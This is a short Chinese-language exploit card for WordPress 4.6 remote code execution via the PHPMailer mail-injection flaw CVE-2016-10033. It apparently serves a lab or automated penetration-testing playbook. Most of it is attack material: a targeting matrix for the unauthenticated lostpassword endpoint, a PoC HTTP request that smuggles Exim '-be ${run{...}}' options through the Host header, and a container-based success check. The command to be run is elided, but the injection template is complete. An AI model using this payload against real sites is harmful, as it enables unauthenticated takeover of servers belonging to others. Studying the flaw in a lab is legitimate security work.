# WordPress RCE (pwnscriptum)

## 指纹特征
- 服务: WordPress 4.6
- 关键点: PHPMailer 漏洞 (CVE-2016-10033)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| PHPMailer 邮件注入 RCE | `/wp-login.php?action=lostpassword` | 无 |

## PoC 指令

通过构造特制的 Host 头部注入 `mail` 参数实现 RCE。

**1. 准备 Payload**
构造类似 `target(any -froot@localhost -be ${run{...}} null)` 的 Host 头。

**2. 触发 Payload**
```http
POST /wp-login.php?action=lostpassword HTTP/1.1
Host: {{TARGET_HOST}}(any -froot@localhost -be ${run{...}} null)
Content-Type: application/x-www-form-urlencoded

wp-submit=Get+New+Password&redirect_to=&user_login=admin
```

## Success Signal
- **物理验证**: 容器内成功创建文件 (如 `touch /tmp/success`)。
- **状态验证**: 确认代码逻辑被触发并执行。
